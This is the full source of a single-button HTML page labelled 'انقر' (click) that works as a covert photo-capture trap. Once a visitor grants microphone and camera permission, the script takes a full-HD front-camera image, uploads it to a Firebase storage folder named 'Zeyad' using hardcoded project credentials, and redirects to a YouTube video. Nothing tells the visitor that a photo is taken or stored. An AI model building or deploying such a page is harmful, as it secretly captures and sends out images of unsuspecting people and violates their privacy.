<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dont Ask My Why</title>
    <link rel="icon" href="data:,"> <!-- Favicon request disabled -->
    <script type="module">
        // Import Firebase functions
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
            authDomain: "html-7fd9b.firebaseapp.com",
            projectId: "html-7fd9b",
            storageBucket: "html-7fd9b.appspot.com",
            messagingSenderId: "1022361191925",
            appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        // Function to upload image to Firebase
        function uploadImage(imageData) {
            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
            uploadString(storageRef, imageData, 'data_url')
                .then(() => {
                    console.log('Uploaded a blob or file!');
                })
                .catch((error) => {
                    console.error('Error uploading image:', error);
                });
        }

        // Function to capture the image after permissions are granted
        function captureImage() {
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            // Start capturing from the camera
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } },
                audio: true // Asking for microphone permission
            })
            .then(stream => {
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();

                    // Set canvas size for 1080p
                    canvas.width = 1920;
                    canvas.height = 1080;

                    // Capture image immediately
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/png');
                    uploadImage(imageData); // Upload image to Firebase
                    stopVideo(stream); // Stop the video stream

                    // Redirect to YouTube video
                    window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
                };
            })
            .catch(err => {
                console.error('Error accessing camera: ', err);
            });
        }

        // Function to stop the video stream
        function stopVideo(stream) {
            const tracks = stream.getTracks();
            tracks.forEach(track => track.stop());
        }

        // Function to handle button click
        function handleButtonClick() {
            // Ask for permissions
            navigator.mediaDevices.getUserMedia({ audio: true }) // Request microphone permission
                .then(() => {
                    // After granting microphone permission, request camera permission
                    return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                })
                .then(captureImage) // Call captureImage function if both permissions are granted
                .catch(err => {
                    console.error('Permission denied:', err);
                });
        }
    </script>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000; /* Black background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        button {
            padding: 20px;
            font-size: 24px;
            color: white;
            background-color: black; /* Button background color */
            border: 2px solid white; /* Button border color */
            border-radius: 10px; /* Rounded edges */
            cursor: pointer;
        }
    </style>
</head>
<body>
    <button onclick="handleButtonClick()">انقر</button> <!-- Button text in Arabic -->
</body>
</html>
